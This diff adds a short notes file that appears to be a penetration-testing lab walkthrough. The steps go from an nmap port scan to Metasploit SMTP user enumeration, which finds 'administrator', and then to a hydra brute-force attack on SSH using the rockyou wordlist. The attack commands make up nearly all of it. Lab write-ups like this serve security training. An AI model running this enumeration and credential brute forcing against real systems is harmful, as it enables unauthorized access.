@@ -1,0 +1,32 @@
+# nmap port scan
+nmap -sT -p- <target_ip>
+
+# run the metasploit
+msfconsole
+
+# search for the module "smtp_version"
+search smtp_version
+
+# use the module
+use auxiliary/scanner/smtp/smtp_version
+
+# run the exploit
+options
+exploit -z
+
+# now use the mother module
+use auxiliary/scanner/smtp/smtp_enum
+options
+set USER_FILE /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
+options
+exploit -z
+
+```
+[*] 10.10.142.244:25  - 10.10.142.244:25 Banner: 220 polosmtp.home ESMTP Postfix (Ubuntu)
+[+] 10.10.142.244:25  - 10.10.142.244:25 Users found: administrator
+
+```
+
+
+# since you have found an username, run hydra
+hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.142.244 ssh
